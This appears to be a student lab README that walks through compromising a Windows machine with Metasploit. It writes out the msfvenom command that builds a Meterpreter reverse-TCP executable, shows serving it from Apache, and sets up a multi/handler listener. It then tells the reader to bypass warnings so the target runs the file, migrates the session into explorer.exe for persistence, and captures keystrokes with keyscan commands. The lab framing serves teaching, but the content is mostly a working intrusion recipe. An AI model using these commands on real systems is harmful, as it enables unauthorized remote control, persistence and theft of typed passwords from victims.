# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:
![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/3180b3e5-f3bd-41f9-8c6d-2c25baafaac9)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT

![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/622458d3-63ea-46e8-88b0-d7219fc479d0)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/366238ad-34ae-4265-b0ab-21cee616b356)

Start apache server
sudo systemctl apache2 start

![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/339c83fd-93a4-4e02-9c24-1c5b2aca5720)


Check the status of apache2

![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/b8232804-5954-4af7-86e3-a57fe55dc83a)

Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler

![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/f4f14403-d3ab-41b3-a48a-0184d37559a1)

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/b811cfb4-582a-4f64-8e85-6ae347b4095e)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/905f45f4-d48b-4104-9908-5c56a22b8607)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/52c7c7d0-03cb-40fd-9fc8-e8999e8ed7b0)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/e25c5d85-fc21-4e1d-b71b-ed05c27f9fe7)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/6878eae1-a7d6-46a8-b2c8-d7d39039f52a)

keyscan_dump	Shows the keystrokes captured so far

![image](https://github.com/lokeshnarayanan/Compromising-windows-using-Metasploit/assets/119393019/fdf08ea3-e631-48dc-a00c-7ce64c588ad9)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
